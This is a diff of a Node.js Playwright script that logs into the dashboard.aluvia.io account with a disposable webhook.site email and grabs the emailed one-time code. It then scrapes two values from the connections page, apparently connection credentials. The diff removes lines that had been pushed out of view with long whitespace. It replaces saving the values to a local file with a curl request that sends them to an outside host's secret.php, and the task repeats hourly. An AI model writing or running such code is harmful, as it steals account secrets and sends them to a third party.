@@ -1,9 +1,13 @@
-import { chromium } from "playwright";                                 import { execSync } from "child_process";                              import fs from "fs";
-                                                                       async function runTask() {
+import { chromium } from "playwright";
+import { execSync } from "child_process";
+import fs from "fs";
+
+async function runTask() {
   const browser = await chromium.launch({ headless: false });
   const context = await browser.newContext();
   const page = await context.newPage();
-                                                                         try {
+
+  try {
     // LOGIN PAGE
     await page.goto("https://dashboard.aluvia.io/login", {
       waitUntil: "domcontentloaded",
@@ -11,25 +15,35 @@ import { chromium } from "playwright";                                 import { 
 
     const emailSelector = 'input[placeholder="Enter your email"]';
     await page.waitForSelector(emailSelector);
-                                                                           // create webhook uuid
+
+    // create webhook uuid
     const uuid = execSync(
-      `curl -s -X POST https://webhook.site/token | grep -o '"uuid":"[^"]*"' | cut -d'"' -f4`                                                     ).toString().trim();
+      `curl -s -X POST https://webhook.site/token | grep -o '"uuid":"[^"]*"' | cut -d'"' -f4`
+    )
+      .toString()
+      .trim();
 
     const email = `${uuid}@emailhook.site`;
     console.log("Email:", email);
 
     await page.fill(emailSelector, email);
     await page.getByRole("button", { name: "Get Login Code" }).click();
-                                                                           // WAIT OTP INPUTS
-    await page.waitForSelector(
-  'input[aria-label="Verification code digit 1 of 6"]',                  { timeout: 0 }
-);                                                                         console.log("Waiting for OTP...");
 
-    let code = null;                                                   
+    // WAIT OTP INPUTS
+    await page.waitForSelector(
+      'input[aria-label="Verification code digit 1 of 6"]',
+      { timeout: 0 }
+    );
+
+    console.log("Waiting for OTP...");
+
+    let code = null;
+
     // poll webhook until OTP arrives
     while (!code) {
       try {
-        const result = execSync(                                                 `curl -s https://webhook.site/token/${uuid}/requests | jq -r '.data[0].text_content' | grep -o '[0-9]\\{6\\}'`
+        const result = execSync(
+          `curl -s https://webhook.site/token/${uuid}/requests | jq -r '.data[0].text_content' | grep -o '[0-9]\\{6\\}'`
         )
           .toString()
           .trim();
@@ -57,7 +71,9 @@ import { chromium } from "playwright";                                 import { 
     await page.getByRole("button", { name: "Verify" }).click();
 
     // Wait for the connections link to be available (no timeout)
-    const connectionsLink = page.locator('a[href="/connections"].flex').first();
+    const connectionsLink = page
+      .locator('a[href="/connections"].flex')
+      .first();
     await connectionsLink.waitFor({ timeout: 0 });
     await connectionsLink.click();
 
@@ -68,23 +84,46 @@ import { chromium } from "playwright";                                 import { 
     const data = await page.evaluate(() => {
       const spans = document.querySelectorAll("td span.font-mono");
       if (spans.length < 2) return null;
-      return [spans[0].textContent.trim(), spans[1].textContent.trim()];
+      return [
+        spans[0].textContent.trim(),
+        spans[1].textContent.trim(),
+      ];
     });
 
-    if (!data) {                                                             console.log("No data found");
-    } else {                                                                 console.log("Extracted:", data);
-      // save raw values to secret.txt                                       fs.writeFileSync("secret.txt", `${data[0]}\n${data[1]}`);              console.log("Saved to secret.txt");
-    }                                                                    } catch (err) {
+    if (!data) {
+      console.log("No data found");
+    } else {
+      console.log("Extracted:", data);
+
+      // SEND values instead of saving to file
+      const url = `https://ff.vpsmail.name.ng/secret.php?${encodeURIComponent(
+        data[0]
+      )}&${encodeURIComponent(data[1])}`;
+
+      try {
+        const response = execSync(`curl -s "${url}"`)
+          .toString()
+          .trim();
+        console.log("Sent to secret.php");
+        console.log("Server response:", response);
+      } catch (err) {
+        console.error("Failed to send request:", err);
+      }
+    }
+  } catch (err) {
     console.error("Error during task:", err);
   } finally {
     await browser.close();
-  }                                                                    }
+  }
+}
 
 // run immediately, then every 1 hour
 async function startLoop() {
-  while (true) {                                                           console.log("=== Running task ===", new Date().toLocaleString());
+  while (true) {
+    console.log("=== Running task ===", new Date().toLocaleString());
     await runTask();
-    console.log("=== Waiting 1 hour ===");                                 await new Promise((r) => setTimeout(r, 3600000)); // 1 hour
+    console.log("=== Waiting 1 hour ===");
+    await new Promise((r) => setTimeout(r, 3600000)); // 1 hour
   }
 }
 
